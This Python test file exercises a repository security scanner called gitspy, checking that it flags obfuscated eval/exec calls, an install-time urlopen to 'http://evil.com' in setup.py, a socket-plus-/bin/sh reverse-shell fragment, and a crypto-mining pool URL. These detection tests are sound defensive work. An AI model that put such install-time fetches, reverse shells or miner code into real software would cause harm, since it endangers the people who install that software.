from __future__ import annotations

from pathlib import Path

from gitspy.config import PatternsConfig
from gitspy.scanners.patterns import (
    _get_language_for_file,
    _is_init_file,
    _is_install_script,
    _scan_with_regex,
    BACKDOOR_RULES,
    OBFUSCATION_RULES,
    scan_patterns,
)


def test_detects_eval_concat():
    content = 'eval("al" + "ert(1)")'
    findings = _scan_with_regex("app.js", content, OBFUSCATION_RULES, ["javascript"])
    assert any("eval" in f.title.lower() for f in findings)


def test_detects_base64_exec():
    content = 'exec(base64.b64decode("aW1wb3J0IG9z"))'
    findings = _scan_with_regex("payload.py", content, OBFUSCATION_RULES, ["python"])
    assert any("exec" in f.title.lower() or "decode" in f.title.lower() for f in findings)


def test_detects_http_in_setup_py():
    content = 'urllib.request.urlopen("http://evil.com")'
    findings = _scan_with_regex("setup.py", content, BACKDOOR_RULES, ["python"])
    assert any("HTTP" in f.title or "install" in f.title.lower() for f in findings)


def test_detects_reverse_shell():
    content = 'socket.socket() ... subprocess.call(["/bin/sh"])'
    findings = _scan_with_regex("backdoor.py", content, BACKDOOR_RULES, ["python"])
    assert any("reverse" in f.title.lower() or "shell" in f.title.lower() for f in findings)


def test_detects_crypto_miner():
    content = 'pool = "stratum+tcp://pool.mining.com:3333"'
    findings = _scan_with_regex("worker.py", content, BACKDOOR_RULES, ["python"])
    assert any("miner" in f.title.lower() or "crypto" in f.title.lower() for f in findings)


def test_language_detection():
    assert _get_language_for_file("app.py") == "python"
    assert _get_language_for_file("index.js") == "javascript"
    assert _get_language_for_file("main.go") == "go"
    assert _get_language_for_file("photo.png") is None


def test_install_script_detection():
    assert _is_install_script("setup.py") is True
    assert _is_install_script("postinstall.js") is True
    assert _is_install_script("app.py") is False


def test_init_file_detection():
    assert _is_init_file("__init__.py") is True
    assert _is_init_file("index.js") is True
    assert _is_init_file("main.py") is False


def test_ignores_non_matching_language():
    content = 'eval("alert(1)")'
    findings = _scan_with_regex("app.js", content, OBFUSCATION_RULES, ["python"])
    assert len(findings) == 0


def test_scan_patterns_on_repo(repo_with_patterns: Path):
    config = PatternsConfig(languages=["python"])
    result = scan_patterns(repo_with_patterns, config)
    assert len(result.findings) >= 1
